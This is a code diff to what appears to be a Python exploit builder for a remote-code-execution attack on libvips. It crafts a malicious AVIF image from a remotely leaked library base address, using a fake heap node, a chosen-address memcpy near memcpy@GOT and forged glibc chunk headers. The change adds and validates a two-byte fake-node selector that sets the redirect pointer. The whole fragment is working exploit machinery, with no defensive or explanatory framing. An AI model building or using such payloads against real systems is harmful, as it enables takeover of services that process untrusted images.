@@ -41,6 +41,7 @@ def _fake_plane_node(write_target: int,
 
 
 def build_rce_payload(libvips_base: int,
+                      fake_node_low16: int,
                       library_path: str | None = None,
                       profile: NativeStackProfile | None = None) -> bytes:
     """Build one runtime-specific AVIF from the remotely leaked DSO base."""
@@ -54,6 +55,12 @@ def build_rce_payload(libvips_base: int,
         )
     if libvips_base & (selected.libvips.leak.base_alignment - 1):
         raise ValueError("libvips base is not page-aligned")
+    if (
+        isinstance(fake_node_low16, bool)
+        or not isinstance(fake_node_low16, int)
+        or not 0 <= fake_node_low16 <= 0xFFFF
+    ):
+        raise ValueError("fake-node selector must fit an unsigned two-byte value")
 
     # The first chosen-address memcpy starts at the profile's backoff before
     # memcpy@GOT. Its source row contains the path field followed by
@@ -73,7 +80,7 @@ def build_rce_payload(libvips_base: int,
     root_chunk_header = struct.pack(
         "<QQ", 0, selected.glibc.root_chunk_size_and_flags,
     )
-    selected_low16 = payload.fake_node_low16.to_bytes(
+    selected_low16 = fake_node_low16.to_bytes(
         payload.redirect_pointer_size, "little",
     )
 
